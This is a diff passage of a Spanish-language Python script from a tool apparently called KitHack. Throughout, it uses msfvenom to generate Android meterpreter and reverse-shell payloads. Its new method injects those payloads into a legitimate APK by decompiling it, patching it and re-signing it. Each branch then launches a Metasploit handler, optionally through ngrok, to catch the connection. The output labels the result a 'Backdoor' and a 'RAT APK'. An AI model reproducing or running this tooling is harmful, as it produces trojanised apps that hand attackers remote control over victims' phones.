+							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')							
+							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+
 					else:
-						print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
+						print("{}\n[X] OPCION INVALIDA\n".format(RED))
 						time.sleep(3)
 						pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
+						os.system('clear')
 						banner(), menu(), options()	
-				
+
 				else:
-					print("{}\n[X] OPCION INVALIDA\n".format(RED))
+					print("\n{}[X] OPCION INVALIDA\n".format(RED))
 					time.sleep(3)
 					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
 					os.system('clear')
 					banner(), menu(), options()	
 
 			elif pay == 3:
+				print '{0}\n [*] {1}Select APK Type:\n'.format(DEFAULT, GREEN)
 				print '{0}[01]{1} APK MSF'.format(WHITE, YELLOW)
 				print '{0}[02]{1} APK ORIGINAL'.format(WHITE, YELLOW)
 				
@@ -1580,69 +2042,153 @@ def options():
 				
 				if a == 1:
 					os.system('python lib/network.py')
-					LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+					LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 					LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
 					OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+					mainout = os.path.splitext(OUT)[0]
 					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 					time.sleep(4)
-					os.system('service postgresql start && msfvenom -p android/meterpreter/reverse_tcp LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, OUT))																				
+					os.system('service postgresql start && msfvenom -p android/meterpreter_reverse_tcp LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, mainout))																				
 					location = os.getcwd()
-					print("\033[1;32m")
-					if os.stat('output/{}.apk'.format(OUT)).st_size != 0:
-						print("Backdoor guardado en {0}/output/{1}.apk".format(location, OUT))	
-						if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-							os.system('service postgresql stop && clear')
+					if os.stat('output/{}.apk'.format(mainout)).st_size != 0:
+						print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
+						if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 							banner(), menu(), options()	
 						else:
-							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
-							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-							os.system('service postgresql stop && clear')
-							banner(), menu(), options()	
+							while LHOST != "0.tcp.ngrok.io":
+								os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
+								pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+								os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+								banner(), menu(), options()	
+							else:
+								os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_tcp; exploit\'"')
+								pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+								os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+								banner(), menu(), options()	
 					else:
-						print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
+						print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
 						time.sleep(3)
 						pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()	
 				
 				elif a == 2:
-					os.system('python lib/network.py')
-					LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
-					LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
-					Tk().withdraw()
-					APK = tkFileDialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
-					print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
-					OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
-					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
-					time.sleep(4)
-					os.system('service postgresql start && msfvenom -x {0} -p android/meterpreter/reverse_tcp LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, OUT))																				
-					location = os.getcwd()
-					print("\033[1;32m")
-					if os.stat('output/{}.apk'.format(OUT)).st_size != 0:	
-		   				print("Backdoor guardado en {0}/output/{1}.apk".format(location, OUT))	
-						if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-							os.system('service postgresql stop && clear')
-							banner(), menu(), options()	
+					print '{0}\n [*] {1}Select Method:\n'.format(DEFAULT, GREEN)
+					print '{0}[01]{1} Use the old Metasploit method'.format(WHITE, YELLOW)
+					print '{0}[02]{1} Use the new KitHack method'.format(WHITE, YELLOW)
+
+					m = input("{0}KitHack >> {1}".format(RED, DEFAULT))
+					
+					if m == 1:
+						os.system('python lib/network.py')
+						LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+						LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
+						Tk().withdraw()
+						APK = tkFileDialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
+						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
+						OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+						mainout = os.path.splitext(OUT)[0]
+						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
+						time.sleep(4)
+						os.system('service postgresql start && msfvenom -x {0} -p android/meterpreter_reverse_tcp LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, mainout))																				
+						location = os.getcwd()
+						if os.stat('output/{}.apk'.format(mainout)).st_size != 0:	
+							print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
+							if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+								os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+								banner(), menu(), options()	
+							else:
+								while LHOST != "0.tcp.ngrok.io":
+									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
+									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+									os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+									banner(), menu(), options()	
+								else:
+									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_tcp; exploit\'"')
+									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+									os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+									banner(), menu(), options()	
 						else:
-							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))					
-							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-							os.system('service postgresql stop && clear')
+							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
+							time.sleep(3)
+							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 							banner(), menu(), options()	
+
+					elif m == 2:
+						os.system('python lib/network.py')
+						LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+						LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
+						Tk().withdraw()
+						APK = tkFileDialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
+						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
+						OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+						mainout = os.path.splitext(OUT)[0]
+						print("\n{0}[*] Generating payload...{1}".format(GREEN, DEFAULT))	
+						time.sleep(4)
+						os.system("service postgresql start && msfvenom -p android/meterpreter_reverse_tcp LPORT={0} LHOST={1} R > output/payload.apk".format(LPORT, LHOST))
+						location = os.getcwd()
+						print("{0}[*] Decompiling original APK...{1}".format(GREEN, DEFAULT))						
+						time.sleep(4)
+						os.system('cp {0} {1}/output/original.apk && apktool d -f -o output/original output/original.apk'.format(APK, location))
+						print("\n{0}[*] Decompiling payload APK...{1}".format(GREEN, DEFAULT))						
+						time.sleep(4)
+						os.system('apktool d -f -o output/payload output/payload.apk')
+						print("\n{0}[*] Configuring RAT Payload...{1}".format(GREEN, DEFAULT))		
+						time.sleep(4)				
+						os.system('bash lib/apkf.sh')
+						print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
+						time.sleep(4)
+						os.system('apktool b output/original -o output/kithack.apk')
+						if os.path.isfile('output/kithack.apk'):
+							print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
+							time.sleep(4)
+							os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/kithack.apk android')	
+							time.sleep(4)
+							os.system('zipalign 4 output/kithack.apk output/{0}.apk'.format(mainout))
+							print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
+							time.sleep(4)
+							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')
+							print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
+							if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+								os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+								banner(), menu(), options()	
+							else:
+								while LHOST != "0.tcp.ngrok.io":
+									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
+									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+									os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+									banner(), menu(), options()	
+								else:
+									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_tcp; exploit\'"')
+									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+									os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+									banner(), menu(), options()	
+						else:
+							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
+							time.sleep(3)
+							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')							
+							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()			
+
 					else:
-						print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
+						print("{}\n[X] OPCION INVALIDA\n".format(RED))
 						time.sleep(3)
 						pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
+						os.system('clear')
 						banner(), menu(), options()	
 
 				else:
-					print("{}\n[X] OPCION INVALIDA\n".format(RED))
+					print("\n{}[X] OPCION INVALIDA\n".format(RED))
 					time.sleep(3)
 					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
 					os.system('clear')
 					banner(), menu(), options()	
 
 			elif pay == 4:
+				print '{0}\n [*] {1}Select APK Type:\n'.format(DEFAULT, GREEN)
 				print '{0}[01]{1} APK MSF'.format(WHITE, YELLOW)
 				print '{0}[02]{1} APK ORIGINAL'.format(WHITE, YELLOW)
 				
@@ -1650,69 +2196,153 @@ def options():
 				
 				if a == 1:
 					os.system('python lib/network.py')
-					LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+					LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 					LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
 					OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+					mainout = os.path.splitext(OUT)[0]
 					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 					time.sleep(4)
-					os.system('service postgresql start && msfvenom -p android/shell/reverse_http LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, OUT))																				
+					os.system('service postgresql start && msfvenom -p android/meterpreter/reverse_tcp LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, mainout))																				
 					location = os.getcwd()
-					print("\033[1;32m")
-					if os.stat('output/{}.apk'.format(OUT)).st_size != 0:
-						print("Backdoor guardado en {0}/output/{1}.apk".format(location, OUT))	
-						if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-							os.system('service postgresql stop && clear')
+					if os.stat('output/{}.apk'.format(mainout)).st_size != 0:
+						print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
+						if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 							banner(), menu(), options()	
 						else:
-							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_http; exploit\'"'.format(LHOST, LPORT))
-							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-							os.system('service postgresql stop && clear')
-							banner(), menu(), options()	
+							while LHOST != "0.tcp.ngrok.io":
+								os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
+								pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+								os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+								banner(), menu(), options()	
+							else:
+								os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter/reverse_tcp; exploit\'"')
+								pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+								os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+								banner(), menu(), options()	
 					else:
-						print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
+						print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
 						time.sleep(3)
 						pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()	
 				
 				elif a == 2:
-					os.system('python lib/network.py')
-					LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
-					LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
-					Tk().withdraw()
-					APK = tkFileDialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
-					print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
-					OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
-					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
-					time.sleep(4)
-					os.system('service postgresql start && msfvenom -x {0} -p android/shell/reverse_http LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, OUT))																				
-					location = os.getcwd()
-					print("\033[1;32m")
-					if os.stat('output/{}.apk'.format(OUT)).st_size != 0:	
-		   				print("Backdoor guardado en {0}/output/{1}.apk".format(location, OUT))	
-						if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-							os.system('service postgresql stop && clear')
-							banner(), menu(), options()	
+					print '{0}\n [*] {1}Select Method:\n'.format(DEFAULT, GREEN)
+					print '{0}[01]{1} Use the old Metasploit method'.format(WHITE, YELLOW)
+					print '{0}[02]{1} Use the new KitHack method'.format(WHITE, YELLOW)
+
+					m = input("{0}KitHack >> {1}".format(RED, DEFAULT))
+					
+					if m == 1:
+						os.system('python lib/network.py')
+						LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+						LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
+						Tk().withdraw()
+						APK = tkFileDialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
+						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
+						OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+						mainout = os.path.splitext(OUT)[0]
+						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
+						time.sleep(4)
+						os.system('service postgresql start && msfvenom -x {0} -p android/meterpreter/reverse_tcp LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, mainout))																				
+						location = os.getcwd()
+						if os.stat('output/{}.apk'.format(mainout)).st_size != 0:	
+							print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
+							if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+								os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+								banner(), menu(), options()	
+							else:
+								while LHOST != "0.tcp.ngrok.io":
+									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
+									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+									os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+									banner(), menu(), options()	
+								else:
+									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter/reverse_tcp; exploit\'"')
+									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+									os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+									banner(), menu(), options()	
 						else:
-							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_http; exploit\'"'.format(LHOST, LPORT))					
-							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-							os.system('service postgresql stop && clear')
+							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
+							time.sleep(3)
+							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 							banner(), menu(), options()	
+
+					elif m == 2:
+						os.system('python lib/network.py')
+						LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+						LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
+						Tk().withdraw()
+						APK = tkFileDialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
+						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
+						OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+						mainout = os.path.splitext(OUT)[0]
+						print("\n{0}[*] Generating payload...{1}".format(GREEN, DEFAULT))	
+						time.sleep(4)
+						os.system("service postgresql start && msfvenom -p android/meterpreter/reverse_tcp LPORT={0} LHOST={1} R > output/payload.apk".format(LPORT, LHOST))
+						location = os.getcwd()
+						print("{0}[*] Decompiling original APK...{1}".format(GREEN, DEFAULT))						
+						time.sleep(4)
+						os.system('cp {0} {1}/output/original.apk && apktool d -f -o output/original output/original.apk'.format(APK, location))
+						print("\n{0}[*] Decompiling payload APK...{1}".format(GREEN, DEFAULT))						
+						time.sleep(4)
+						os.system('apktool d -f -o output/payload output/payload.apk')
+						print("\n{0}[*] Configuring RAT Payload...{1}".format(GREEN, DEFAULT))		
+						time.sleep(4)				
+						os.system('bash lib/apkf.sh')
+						print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
+						time.sleep(4)
+						os.system('apktool b output/original -o output/kithack.apk')
+						if os.path.isfile('output/kithack.apk'):
+							print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
+							time.sleep(4)
+							os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/kithack.apk android')	
+							time.sleep(4)
+							os.system('zipalign 4 output/kithack.apk output/{0}.apk'.format(mainout))
+							print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
+							time.sleep(4)
+							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')
+							print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
+							if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+								os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+								banner(), menu(), options()	
+							else:
+								while LHOST != "0.tcp.ngrok.io":
+									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
+									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+									os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+									banner(), menu(), options()	
+								else:
+									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter/reverse_tcp; exploit\'"')
+									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+									os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+									banner(), menu(), options()	
+						else:
+							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
+							time.sleep(3)
+							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')							
+							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()			
+
 					else:
-						print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
+						print("{}\n[X] OPCION INVALIDA\n".format(RED))
 						time.sleep(3)
 						pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
-						banner(), menu(), options()		
+						os.system('clear')
+						banner(), menu(), options()	
 
 				else:
-					print("{}\n[X] OPCION INVALIDA\n".format(RED))
+					print("\n{}[X] OPCION INVALIDA\n".format(RED))
 					time.sleep(3)
 					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
 					os.system('clear')
-					banner(), menu(), options()	
+					banner(), menu(), options()
 
 			elif pay == 5:
+				print '{0}\n [*] {1}Select APK Type:\n'.format(DEFAULT, GREEN)
 				print '{0}[01]{1} APK MSF'.format(WHITE, YELLOW)
 				print '{0}[02]{1} APK ORIGINAL'.format(WHITE, YELLOW)
 				
@@ -1720,69 +2350,153 @@ def options():
 				
 				if a == 1:
 					os.system('python lib/network.py')
-					LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+					LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 					LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
 					OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+					mainout = os.path.splitext(OUT)[0]
 					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 					time.sleep(4)
-					os.system('service postgresql start && msfvenom -p android/shell/reverse_https LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, OUT))																				
+					os.system('service postgresql start && msfvenom -p android/shell/reverse_http LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, mainout))																				
 					location = os.getcwd()
-					print("\033[1;32m")
-					if os.stat('output/{}.apk'.format(OUT)).st_size != 0:
-						print("Backdoor guardado en {0}/output/{1}.apk".format(location, OUT))	
-						if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-							os.system('service postgresql stop && clear')
+					if os.stat('output/{}.apk'.format(mainout)).st_size != 0:
+						print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
+						if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 							banner(), menu(), options()	
 						else:
-							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_https; exploit\'"'.format(LHOST, LPORT))
-							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-							os.system('service postgresql stop && clear')
-							banner(), menu(), options()	
+							while LHOST != "0.tcp.ngrok.io":
+								os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_http; exploit\'"'.format(LHOST, LPORT))
+								pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+								os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+								banner(), menu(), options()	
+							else:
+								os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_http; exploit\'"')
+								pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+								os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+								banner(), menu(), options()	
 					else:
-						print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
+						print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
 						time.sleep(3)
 						pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()	
 				
 				elif a == 2:
-					os.system('python lib/network.py')
-					LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
-					LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
-					Tk().withdraw()
-					APK = tkFileDialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
-					print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
-					OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
